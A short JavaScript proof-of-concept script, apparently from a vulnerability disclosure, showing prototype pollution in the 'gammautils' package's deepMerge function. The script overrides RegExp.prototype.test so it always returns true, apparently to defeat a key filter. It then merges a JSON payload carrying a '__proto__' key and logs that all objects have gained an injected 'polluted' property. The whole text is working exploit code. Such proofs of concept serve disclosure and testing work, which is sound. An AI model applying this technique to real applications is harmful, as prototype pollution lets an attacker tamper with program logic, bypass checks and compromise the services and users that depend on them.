RegExp.prototype.test = () => true;
console.log({}.polluted);
const gammautils = require('gammautils');
var payload = JSON.parse('{"__proto__":{"polluted":"yes"}}');
gammautils.object.deepMerge({}, payload);
console.log({}.polluted);